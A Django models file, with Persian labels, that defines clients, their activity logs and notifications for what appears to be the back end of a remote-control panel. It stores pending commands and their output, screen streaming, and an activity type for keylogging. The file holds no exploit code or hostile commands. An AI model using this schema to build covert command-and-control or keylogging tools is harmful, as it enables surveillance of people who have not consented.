from django.db import models
from django.utils import timezone
import uuid
from datetime import timedelta
import json

class Client(models.Model):
    client_id = models.CharField(max_length=255, unique=True)
    display_name = models.CharField(max_length=255, blank=True, null=True)
    token = models.CharField(max_length=255)
    last_seen = models.DateTimeField(default=timezone.now)
    last_command = models.TextField(null=True, blank=True)
    command_id = models.UUIDField(null=True, blank=True)
    last_output = models.TextField(null=True, blank=True)
    system_info = models.JSONField(default=dict, blank=True)
    is_streaming = models.BooleanField(default=False)
    stream_type = models.CharField(max_length=20, blank=True, null=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return self.display_name or self.client_id

    @property
    def is_online(self):
        return self.last_seen >= timezone.now() - timedelta(seconds=30)

    @property
    def cpu_usage(self):
        return self.system_info.get('cpu_usage', '0%')

    @property
    def ram_usage(self):
        return self.system_info.get('ram_usage', '0%')

    @property
    def disk_usage(self):
        return self.system_info.get('disk_usage', '0%')

    @property
    def os_info(self):
        return self.system_info.get('os', 'نامشخص')

    class Meta:
        db_table = 'root_client'
        verbose_name = 'کلاینت'
        verbose_name_plural = 'کلاینت‌ها'
        ordering = ['-last_seen']

class ClientActivity(models.Model):
    ACTIVITY_TYPES = [
        ('command', 'دستور'),
        ('connection', 'اتصال'),
        ('stream', 'استریم'),
        ('file', 'فایل'),
        ('keylogger', 'کیلاگر'),
        ('other', 'سایر'),
    ]

    client = models.ForeignKey(Client, on_delete=models.CASCADE, related_name='activities')
    activity_type = models.CharField(max_length=20, choices=ACTIVITY_TYPES)
    description = models.TextField()
    details = models.JSONField(default=dict, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        db_table = 'root_client_activity'
        verbose_name = 'فعالیت کلاینت'
        verbose_name_plural = 'فعالیت‌های کلاینت'
        ordering = ['-created_at']

class Notification(models.Model):
    NOTIFICATION_TYPES = [
        ('info', 'اطلاعیه'),
        ('success', 'موفقیت'),
        ('warning', 'هشدار'),
        ('error', 'خطا'),
    ]

    client = models.ForeignKey(Client, on_delete=models.CASCADE, related_name='notifications', null=True, blank=True)
    notification_type = models.CharField(max_length=20, choices=NOTIFICATION_TYPES)
    title = models.CharField(max_length=100)
    message = models.TextField()
    is_read = models.BooleanField(default=False)
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        db_table = 'root_notification'
        verbose_name = 'اعلان'
        verbose_name_plural = 'اعلان‌ها'
        ordering = ['-created_at']